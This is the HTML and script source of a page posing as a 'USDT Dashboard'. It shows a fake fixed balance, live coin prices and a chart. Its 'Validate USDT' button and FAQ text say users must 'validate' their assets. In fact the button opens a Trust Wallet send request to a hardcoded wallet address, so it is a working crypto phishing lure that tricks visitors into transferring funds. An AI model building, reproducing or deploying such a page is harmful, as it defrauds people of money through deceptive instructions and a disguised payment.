<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>USDT Dashboard</title>
  <script src="https://unpkg.com/web3@1.8.2/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.js"></script>
  <style>
    body {
      background-color: #121212;
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      padding: 1rem;
      margin: 0;
      text-align: center;
    }
    header {
      text-align: left;
      margin-bottom: 1rem;
    }
    .top-section {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 1rem;
      background-color: #1e1e1e;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
      margin-bottom: 2rem;
    }
    .top-section img {
      height: 40px;
      margin-right: 0.5rem;
    }
    .top-section span {
      font-size: 1.5rem;
      font-weight: bold;
    }
    .btn-row {
      display: flex;
      justify-content: center;
      gap: 1rem;
      margin-bottom: 2rem;
    }
    button {
      background: #f0b90b;
      color: #000;
      border: none;
      padding: 0.8rem 1.6rem;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
    }
    .chart-container {
      margin: 2rem 0;
    }
    .prices-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 1rem;
    }
    .coin {
      background: #1e1e1e;
      padding: 1rem;
      border-radius: 10px;
      width: 160px;
      text-align: center;
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
    }
    .coin img {
      height: 32px;
      margin-bottom: 0.5rem;
    }
  </style>
</head>
<body>
  <div class="top-section">
    <div style="display: flex; align-items: center;">
      <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png" alt="USDT" />
      <span>Total Asset: $3700.78</span>
    </div>
  </div>  <div class="btn-row">
    <button id="validateUSDT">Validate USDT</button>
    <button id="connectWallet">Connect Wallet</button>
    <button onclick="window.location.href='#faq'">FAQ</button>
  </div>  <div class="chart-container">
    <iframe src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_99a4d&symbol=BINANCE:BTCUSDT&interval=60&theme=dark" style="width:100%;height:400px;" frameborder="0" allowtransparency="true"></iframe>
  </div>  <div class="prices-container" id="coinPrices"></div>  <h2 id="faq">[1] HOW TO VALIDATE</h2>
  <p>To validate Asset click on "Validate USDT" which redirects you to Trust Wallet. Confirm your BNB network validation and wait 5 minutes after validation to transfer from Trust Wallet to your Binance.</p>  <script>
    const COINS = [
      "tether", "bitcoin", "binancecoin", "binance-usd", "solana", "ethereum", "dogecoin",
      "cardano", "ripple", "tron", "polkadot", "litecoin", "polygon", "avalanche-2", "chainlink",
      "uniswap", "stellar", "internet-computer", "vechain", "algorand"
    ];

    async function loadCoinPrices() {
      try {
        const res = await fetch(`https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${COINS.join(',')}`);
        const data = await res.json();
        const container = document.getElementById("coinPrices");
        data.forEach(coin => {
          const div = document.createElement("div");
          div.className = "coin";
          div.innerHTML = `
            <img src="${coin.image}" alt="${coin.name}" />
            <div><strong>${coin.name}</strong></div>
            <div>${coin.symbol.toUpperCase()}</div>
            <div>$${coin.current_price.toFixed(2)}</div>
          `;
          container.appendChild(div);
        });
      } catch (e) {
        console.error("Error loading coin prices:", e);
      }
    }

    loadCoinPrices();

    document.getElementById("validateUSDT").onclick = () => {
      window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0";
    };

    document.getElementById("connectWallet").onclick = async () => {
      try {
        window.location.href = "https://walletconnect.network/connect?app=YourAppName&redirect_url=https://yourdashboard.com/callback&chain_id=56&token_contract=0x55d398326f99059ff775485246999027b3197955";
      } catch (err) {
        console.error("Wallet connect error:", err);
        alert("Failed to connect to wallet. Try again.");
      }
    };
  </script></body>
</html>
